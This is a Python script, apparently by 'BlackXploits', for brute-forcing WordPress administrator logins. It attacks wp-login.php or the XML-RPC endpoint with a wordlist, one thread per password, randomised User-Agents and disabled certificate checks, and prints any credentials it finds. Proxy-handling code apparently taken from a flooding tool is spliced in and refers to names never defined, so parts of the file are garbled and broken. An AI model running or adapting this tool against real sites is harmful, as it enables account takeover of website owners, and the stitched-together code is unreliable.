#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: BlackXploits
# Special thank's to: stamparm (Miroslav Stampar)
# PLEASE DON'T DELETE THIS COPYRGHT
# --------------------------------------------

import urllib.request, urllib.parse, urllib.error
import urllib.request, urllib.error, urllib.parse
import client
import httplib2
from contextlib import suppress
import time
import socket, sys, os, os.path, argparse, random
from threading import Thread
from time import sleep
from typing import Any, List, Set, Tuple
from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from json import load
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                    gethostname, socket)

w  = '\033[0m'
r  = '\033[31m'
y  = '\033[93m'
g  = '\033[32m'
b  = '\033[34m'

os.system('clear')

def randomAgentGen():

 userAgent =    ['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/538.46 (KHTML, like Gecko) Version/8.0 Safari/538.46',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10',
                'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
                'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
                'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9',
                'Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
                'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
                'Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36']

 UA = random.choice(userAgent)
 return UA

jembut = """
 __      ____________         __________               __          
/  \    /  \______   \        \______   \______ __ ___/  |_  ____  
\   \/\/   /|     ___/  ______ |    |  _|_  __ \  |  \   __\/ __ \ 
 \        / |    |     /_____/ |    |   \|  | \/  |  /|  | \  ___/ 
  \__/\  /  |____|             |______  /|__|  |____/ |__|  \___  >
       \/                             \/                        \/  

                    Author: BlackXploits
                     Telegram: @BlackXploits
"""

def urlCMS(url,brutemode):
    if url[:8] != "https://" and url[:7] != "http://":
        print((g+'\n[*]'+w+' You must insert http:// or https:// procotol'))
        os._exit(1)
    # Login Page WordPress
    if brutemode == "std":
       url = url+'/wp-login.php'
    else:
       url = url+'/xmlrpc.php'
    return url

def bodyCMS(username,pwd,brutemode):
    if brutemode == "std":
       body = { 'log':username,
       'pwd':pwd,
       'wp-submit':'Login',
       'testcookie':'1' }
    else:
       body = """<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName>
         <params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (username, pwd)
    return body


def headersCMS(UA,lenbody,brutemode):
    if brutemode == "std":
       headers = { 'User-Agent': UA,
                   'Content-type': 'application/x-www-form-urlencoded',
                   'Cookie': 'wordpress_test_cookie=WP+Cookie+check' }
    else:
       headers = { 'User-Agent': UA,
                   'Content-type': 'text/xml',
                   'Content-Length': "%d" % len(lenbody)}
    return headers

def responseCMS(response):
    if response['set-cookie'].split(" ")[-1] == "httponly":
        return "1"

def connection(url,user,password,UA,timeout,brutemode):

    username = user
    pwd = password

    http = httplib2.Http(timeout=timeout, disable_ssl_certificate_validation=True)

    # HTTP POST Data
    body = bodyCMS(username,pwd,brutemode)

    # Headers xcv   bnm
    headers = headersCMS(UA,body,brutemode) 

    try:  

        if brutemode == "std":   
           response, content = http.request(url, 'POST', headers=headers, body=urllib.parse.urlencode(body))

           if str(response.status)[0] == "4" or  str(response.status)[0] == "5":
              print((r+'[!] HTTP error, code: '+w+str(response.status)))
              os._exit(1)
 
           if responseCMS(response) == "1":    
              print('\n') 
              print((g+'[*]'+w+' Password FOUND !'))
              print('')
              print(('[!] Username: '+user+' Password: '+ password))
              os._exit(0)
                              
           checkCon = "OK"
           return checkCon 
        else:
           response, content = http.request(url, 'POST', headers=headers, body=body)

           if str(response.status)[0] == "4" or str(response.status)[0] == "5":
              print((r+'[!] HTTP error, code: '+str(response.status)))
              os._exit(1)

           # Menghapus semua karakter kosong & baris baru
           print(content)
           xmlcontent = content.decode('latin-1').replace(" ", "").replace("\n","")

           if not "faultCode" in xmlcontent:
              print('\n')
              print((g+'[*]'+w+' Password FOUND!'))
              print('')
              print(('[!] Username: '+user+' Password: '+password))
              os._exit(0)

           checkCon = "OK"
           return checkCon

    except socket.timeout:
         print((r+'\n\n[!]'+w+' Connection Timeout'))
         os._exit(1)
    except socket.error:
         print((r+'\n[!]'+w+' Connection Refused'))
         os._exit(1)
    except client.ResponseNotReady:
        print((r+'\n[!]'+w+' Server Not Responding'))
        os._exit(1)
    except httplib2.ServerNotFoundError:
        print((r+'\n[!]'+w+' Server Not Found'))
        os._exit(1)
    except httplib2.HttpLib2Error:
        print((r+'\n[!] Connection Error !'))
        os._exit(1)

class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self

class ProxyManager:

    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
                providrs))
        proxes: Set[Proxy] = set()

        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError,
                      exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
        return proxes
    
    @staticmethod
    def open_connection(self, host=None) -> socket:
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(.9)
        sock.connect(host or self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock,
                                   server_hostname=host[0] if host else self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    @staticmethod
    def openConfigForProxies():
      with open(__dir__ / "config.json") as f:
        con = load(f)
      return con

    @staticmethod
    def handleProxyList(con, proxy_li, proxy_ty, url=None):
        if proxy_ty not in {4, 5, 1, 0, 6}:
            exit("Socks Type Not Found [4, 5, 1, 0, 6]")
        if proxy_ty == 6:
            proxy_ty = randchoice([4, 5, 1])
        if not proxy_li.exists():
            logger.warning(
                f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
            proxy_li.parent.mkdir(parents=True, exist_ok=True)
            with proxy_li.open("w") as wr:
                Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
                logger.info(
                    f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
                )
                Proxies = ProxyChecker.checkAll(
                    Proxies, timeout=5, threads=threads,
                    url=url.human_repr() if url else "http://httpbin.org/get",
                )

                if not Proxies:
                    exit(
                        "Proxy Check failed, Your network may be the problem"
                        " | The target may not be available."
                    )
                stringBuilder = ""
                for proxy in Proxies:
                    stringBuilder += (proxy.__str__() + "\n")
                wr.write(stringBuilder)

        proxies = ProxyUtiles.readFromFile(proxy_li)
        if proxies:
            logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
        else:
            logger.info(
                f"{bcolors.WARNING}Empty Proxy File, running flood without proxy{bcolors.RESET}")
            proxies = None

        return proxies


def blocks(files, size=65536):
    while True:
        b = files.read(size)
        if not b: break
        yield b

commandList = argparse.ArgumentParser(sys.argv[0])
commandList.add_argument('-s', '--standard',
                  action="store_true",
                  dest="standard",
                  help="Standard login brute",
                  )
commandList.add_argument('-x', '--xml-rpc',
                  action="store_true",
                  dest="xml",
                  help="Xml-rpc login brute",
                  )
commandList.add_argument('-t', '--target',
                  action="store",
                  dest="target",
                  help="Insert URL: http://www.site.com",
                  )
commandList.add_argument('-u', '--username',
                  action="store",
                  dest="username",
                  help="Insert username",
                  )
commandList.add_argument('-w', '--wordlist',
                  action="store",
                  dest="wordlist",
                  help="Insert wordlist file",
                  )
commandList.add_argument('--timeout',
                  action="store",
                  dest="timeout",
                  default=10,
                  type=int,
                  help="Timeout Value)",
                  )

options = commandList.parse_args()

# Cek mode bruteforce conflict
if options.standard and options.xml:
   print((g+"[-s]"+w+" Select standard bruteforce mode "+y+"|OR|"+g+" [-x]"+w+" xml-rpc bruteforce mode"))
   sys.exit(1)

# Check argument
if not options.standard and not options.xml:
    print(jembut)
    print()
    commandList.print_help()
    sys.exit(1)
elif not options.target or not options.username or not options.wordlist:
    print(jembut)
    print()
    commandList.print_help()
    sys.exit(1)

# Set bruteforce mode
if options.standard:
   brtmd="std"
else:
   brtmd="xml"

url = options.target
user = options.username
wlfile = options.wordlist
timeout = options.timeout

# Memeriksa file Wordlist
if not os.path.isfile(wlfile) and not os.access(wlfile, os.R_OK):
    print((r+"[*]"+w+" Wordlist file is missing or is not readable"))
    sys.exit(1)

# Gen Random UserAgent
UA  = randomAgentGen()
url = urlCMS(url,brtmd)

wlsize = os.path.getsize(wlfile) >>20
if wlsize < 100:
    with open(wlfile, encoding='latin-1') as f:
        wordlisttotal = sum(bl.count("\n") for bl in blocks(f))
else:
    wordlisttotal="unknown"

print(jembut)
print()
print((y+'[*] Target           : '+w+options.target))
print((y+'[*] Username         : '+w+user))
print((y+'[*] Wordlist Total   : '+w+str(wordlisttotal)))
if brtmd == "std":
   print((y+'[*] Bruteforce Mode  :'+w+' Standard'))
else:
   print((y+'[*] Bruteforce Mode  :'+w+' xml-rpc'))
print((b+'\n\n[*]'+w+' Connecting . . .'))

# Check koneksi dengan fake-login
#if connection(url,user,UA,UA,timeout,brtmd) == "OK":
#   print((g+'[*]'+w+' Successfully Connected'))

# Reset var untuk "progress bar"
count = 0

threads = []

with open(wlfile, encoding='latin-1') as wordlist:
        for pwd in wordlist:
            #with suppress(Exception), open_connection(AF_INET, SOCK_STREAM) as s:
                count += 1
                t = Thread(target=connection, args=(url,user,pwd,UA,timeout,brtmd))
                t.start()
                threads.append(t)
                sys.stdout.write('\r')
                sys.stdout.write(g+'[*]'+w+' Bruteforce Running : '+str(count)+'/'+str(wordlisttotal))
                sys.stdout.flush()
                sleep(0.110)
             #   continue
        

for a in threads:
    a.join()
# Password tidak ditemukan
print((r+'\n[!]'+w+' Password NOT found !'))
